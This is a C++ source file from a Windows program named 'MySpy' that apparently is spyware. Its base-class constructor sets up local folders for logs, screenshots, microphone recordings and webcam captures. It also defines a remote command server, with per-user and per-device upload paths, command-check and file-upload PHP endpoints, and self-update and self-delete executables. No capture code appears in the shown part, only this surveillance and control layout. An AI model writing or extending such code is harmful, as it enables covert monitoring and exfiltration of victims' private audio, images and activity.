// Filename: class.base.cpp
// Author:   Patryk Po³eæ

#include "engine.h"

////////////////////////////////////////////////////////////////////////////////////////////////// Constructor and destructor
C_Base::C_Base()
{
	// Public fields

	// System path
	GetTempPath(sizeof(bufferChar), bufferChar);
	pathTemp = bufferChar;

	SHGetFolderPath(NULL, CSIDL_PROFILE, NULL, 0, bufferChar);
	pathUser = bufferChar;

	// Client
	_getcwd(bufferChar, sizeof(bufferChar));
	client = bufferChar;

	ncdData         = "Data";
	ncdDataLogs     = "Logs";
	ncdDataScreens  = "Screens";
	ncdDataSoundMic = "SoundMic";
	ncdDataWebCam   = "WebCam";

	pcdData         = ncdData;
	
	pcdDataLogs     = pcdData + "\\" + ncdDataLogs;
	pcdDataScreens  = pcdData + "\\" + ncdDataScreens;
	pcdDataSoundMic = pcdData + "\\" + ncdDataSoundMic;
	pcdDataWebCam   = pcdData + "\\" + ncdDataWebCam;
	
	ncfMySpyExe  = "MySpy.exe";
	ncfDeleteExe = "MySpyDelete.exe";
	ncfUpdateExe = "MySpyUpdate.exe";

	pcfMySpyExe  = client + "\\" + ncfMySpyExe;
	pcfDeleteExe = pathTemp + ncfDeleteExe;
	pcfUpdateExe = pathTemp + ncfUpdateExe;

	// Server
	server = "http://www.nazwa.com/Server";

	nsdApi   = "Api";
	nsdUsers = "Users";

	nsdUsersUser   = "u1026783327";
	nsdUsersDelete = "Delete";
	nsdUsersUpdate = "Update";

	nsdUsersUserDevice = "d4193824528";

	nsdUsersUserDeviceData = "Data";

	nsdUsersUserDeviceDataLogs     = "Logs";
	nsdUsersUserDeviceDataScreens  = "Screens";
	nsdUsersUserDeviceDataSoundMic = "SoundMic";
	nsdUsersUserDeviceDataWebCam   = "WebCam";

	psdApi   = server + "/" + nsdApi;
	psdUsers = server + "/" + nsdUsers;

	psdUsersUser   = psdUsers + "/" + nsdUsersUser;
	psdUsersDelete = psdUsers + "/" + nsdUsersDelete;
	psdUsersUpdate = psdUsers + "/" + nsdUsersUpdate;

	psdUsersUserDevice = psdUsersUser + "/" + nsdUsersUserDevice;
	psdUsersUserDelete = psdUsersUser + "/" + nsdUsersDelete;
	psdUsersUserUpdate = psdUsersUser + "/" + nsdUsersUpdate;

	psdUsersUserDeviceData   = psdUsersUserDevice + "/" + nsdUsersUserDeviceData;
	psdUsersUserDeviceDelete = psdUsersUserDevice + "/" + nsdUsersDelete;
	psdUsersUserDeviceUpdate = psdUsersUserDevice + "/" + nsdUsersUpdate;

	psdUsersUserDeviceDataLogs     = psdUsersUserDeviceData + "/" + nsdUsersUserDeviceDataLogs;
	psdUsersUserDeviceDataScreens  = psdUsersUserDeviceData + "/" + nsdUsersUserDeviceDataScreens;
	psdUsersUserDeviceDataSoundMic = psdUsersUserDeviceData + "/" + nsdUsersUserDeviceDataSoundMic;
	psdUsersUserDeviceDataWebCam   = psdUsersUserDeviceData + "/" + nsdUsersUserDeviceDataWebCam;

	nsfApiCheckCommandPhp = "check-command.php";
	nsfApiSaveFilePhp     = "save-file.php";
	nsfApiSaveScreenPhp   = "save-screen.php";

	nsfUsersDeleteExe = "Delete.exe";
	nsfUsersUpdateExe = "Update.exe";

	psfApiCheckCommandPhp = psdApi + "/" + nsfApiCheckCommandPhp;
	psfApiSaveFilePhp     = psdApi + "/" + nsfApiSaveFilePhp;
	psfApiSaveScreenPhp   = psdApi + "/" + nsfApiSaveScreenPhp;

	psfUsersDeleteExe = psdUsersDelete + "/" + nsfUsersDeleteExe;
	psfUsersUpdateExe = psdUsersUpdate + "/" + nsfUsersUpdateExe;

	psfUsersUserDeleteExe = psdUsersUserDelete + "/" + nsfUsersDeleteExe;
	psfUsersUserUpdateExe = psdUsersUserUpdate + "/" + nsfUsersUpdateExe;

	psfUsersUserDeviceDeleteExe = psdUsersUserDeviceDelete + "/" + nsfUsersDeleteExe;
	psfUsersUserDeviceUpdateExe = psdUsersUserDeviceUpdate + "/" + nsfUsersUpdateExe;
}

C_Base::~C_Base()
{
	
}

////////////////////////////////////////////////////////////////////////////////////////////////// Public methods